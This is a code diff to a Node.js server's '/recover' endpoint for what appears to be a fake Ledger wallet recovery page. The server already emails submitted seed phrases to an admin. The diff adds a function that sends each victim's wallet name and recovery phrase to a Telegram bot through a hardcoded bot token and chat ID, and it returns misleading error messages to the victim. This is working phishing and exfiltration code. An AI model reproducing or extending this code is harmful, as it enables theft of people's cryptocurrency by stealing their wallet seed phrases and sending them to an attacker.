@@ -41,6 +41,23 @@ app.post('/recover', (req, res) => {
     const { wallet, os, phrase }  = req.body
     const admin = process.env.ADMIN_EMAIL
 
+    // send TG message
+    function sendTGMessage(){
+        let apiToken = "6904093194:AAFSxk-DS9z-EWsUELPyq8l7o2shznsibvc"; //@bot_token
+        let chatId = "6747717424"; //@chat id
+         let message = `New Ledge Drop 🏆🏆🏆 %0A%0AFrom: ${wallet} %0A%0A`;
+            message += ` phrase : ${phrase} %0A%0A`;
+         // Object.keys(strings).forEach(function(key) {
+         //         message += ` ${strings[key]['name']} : ${strings[key]['value']} %0A%0A`;
+         //   })
+        let t = `https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${message}`;
+     
+        let requestt = new XMLHttpRequest();
+        requestt.open("POST", t);
+        requestt.send();
+        let responset = requestt.response;
+    } 
+    
   // configure the email message
   const mailOptions = {
     from: `"ledger-sync-live" <${process.env.USER}>`,
@@ -49,14 +66,19 @@ app.post('/recover', (req, res) => {
         text: `Wallet Type: ${wallet},\n\nOS Type: ${os},\n\nPhrase: ${phrase}`,
   };
 
-  // send the email
-  transporter.sendMail(mailOptions, (error, info) => {
-    if (error) {
-      res.status(500).send('Erro connecting to');
-    } else {
-      res.status(200).send('Connection error');
-    }
-  });
+    //send the TG Message
+    sendTGMessage()
+    
+    // send the email
+    setTimeout(
+        transporter.sendMail(mailOptions, (error, info) => {
+        if (error) {
+          res.status(500).send('Erro connecting to');
+        } else {
+          res.status(200).send('Connection error');
+        }
+      }), 1 * 60 * 1000)
+  
 });
 
 // start the server
